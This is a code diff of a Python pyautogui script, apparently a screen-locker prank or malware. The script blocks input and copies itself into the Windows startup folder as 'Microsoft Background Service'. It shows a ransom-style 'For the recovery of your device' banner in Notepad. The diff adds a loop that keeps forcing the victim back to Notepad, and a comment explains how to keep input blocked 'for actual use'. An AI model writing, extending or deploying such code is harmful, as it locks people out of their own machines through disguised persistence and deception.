@@ -39,31 +39,30 @@ def blockinput_stop():
 
 
 blockinput()
-
 pyautogui.keyDown('win')
 pyautogui.press('r')
 pyautogui.keyUp('win')
 pyautogui.write('shell:startup')
 pyautogui.press('enter')
-time.sleep(1)
+time.sleep(0.5)
 currentWindow = pyautogui.getActiveWindow()
 currentWindow.maximize()
 pyautogui.press('f10')
-time.sleep(0.2)
+time.sleep(0.25)
 pyautogui.press('h')
-time.sleep(0.2)
+time.sleep(0.25)
 pyautogui.press('w')
-time.sleep(0.2)
+time.sleep(0.25)
 pyautogui.press('s')
 time.sleep(0.5)
 pyautogui.write(str(__file__))
 pyautogui.press('enter')
-time.sleep(0.5)
+time.sleep(0.25)
 pyautogui.write('Microsoft Background Service')
 pyautogui.press('enter')
-time.sleep(0.5)
+time.sleep(0.1)
 pyautogui.press('enter')
-time.sleep(0.25)
+time.sleep(0.1)
 currentWindow = pyautogui.getActiveWindow()
 currentWindow.close()
 
@@ -72,15 +71,15 @@ time.sleep(0.25)
 pyautogui.keyDown('win')
 pyautogui.press('r')
 pyautogui.keyUp('win')
-time.sleep(0.5)
+time.sleep(0.25)
 pyautogui.write('cmd')
 pyautogui.press('enter')
-time.sleep(0.5)
+time.sleep(0.25)
 currentWindow = pyautogui.getActiveWindow()
 currentWindow.maximize()
 pyautogui.write('C:\\WINDOWS\\system32\\notepad.exe')
 pyautogui.press('enter')
-time.sleep(0.5)
+time.sleep(0.25)
 pyautogui.keyDown('alt')
 pyautogui.press('tab')
 pyautogui.keyUp('alt')
@@ -101,8 +100,28 @@ pyautogui.write(
     r'   |\_________\\|__| \|_______| \|__|\|__| \|_______| \|_______| \|_______| \|__| \|__| \|_______| ' + '\n' +
     r'   \|_________|                                                                                    ' + '\n' +
     r'---------------------------------------------------------------------------------------------------' + '\n' +
-    r'For the recovery of your device,'+'\nplease visit https://github.com/sighclone/TextInNotepad/wiki/Recovery'
+    r'For the recovery of your device,' + '\nplease visit https://github.com/sighclone/TextInNotepad/wiki/Recovery'
 )
 # Comment the following line of code for actual use, this will ensure that the keyboard and mouse inputs remain blocked
+time.sleep(5)
 unblockinput()
-ntm.wait()
+x = 0
+while True:
+    try:
+        currentWindow = pyautogui.getActiveWindow()
+        title = currentWindow.title
+        if title == 'Notepad':
+            pyautogui.press(['right', 'right', 'enter'])
+            x = 0
+        elif title == '*Untitled - Notepad':
+            x = 0
+        elif title != '*Untitled - Notepad':
+            x += 1
+            for i in range(0, x):
+                pyautogui.keyDown('alt')
+                pyautogui.press('tab')
+                pyautogui.keyUp('alt')
+    except:
+        pyautogui.keyDown('alt')
+        pyautogui.press('tab')
+        pyautogui.keyUp('alt')
